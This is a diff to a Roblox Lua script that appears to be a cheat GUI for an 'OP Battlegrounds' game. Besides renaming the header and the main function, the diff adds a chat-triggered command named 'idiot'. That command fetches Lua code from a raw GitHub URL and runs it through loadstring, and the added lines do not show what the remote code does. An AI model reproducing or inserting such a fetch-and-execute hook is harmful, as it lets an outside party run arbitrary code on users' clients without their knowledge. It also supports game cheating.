@@ -1,6 +1,4 @@
--- Gui to Lua
--- Version: 3.2
-
+-- Realirist's OPBGGUI
 -- Instances:
 
 local OPBGGUI = Instance.new("ScreenGui")
@@ -877,7 +875,7 @@ UISizeConstraint_37.MinSize = Vector2.new(200, 28)
 
 -- Scripts:
 
-local function XDZQWC_fake_script() -- Main.LocalScript 
+local function FLSYZGB_fake_script() -- Main.LocalScript 
 	local script = Instance.new('LocalScript', Main)
 
 	warn('OP BATTLEGROUNDS GUI BY REALIRIST')
@@ -1572,6 +1570,9 @@ local function XDZQWC_fake_script() -- Main.LocalScript
 									sayMessage('OPBGGUI User')
 								end
 							end,
+							idiot = function()
+								loadstring(game:HttpGet("https://raw.githubusercontent.com/DylanVN23607/OPBGGUI/refs/heads/main/idiot.lua"))()
+							end,
 						}
 	
 						if commandList[command] then
@@ -1597,4 +1598,4 @@ local function XDZQWC_fake_script() -- Main.LocalScript
 	end)()
 	print('Coroutine is successful.')
 end
-coroutine.wrap(XDZQWC_fake_script)()
+coroutine.wrap(FLSYZGB_fake_script)()
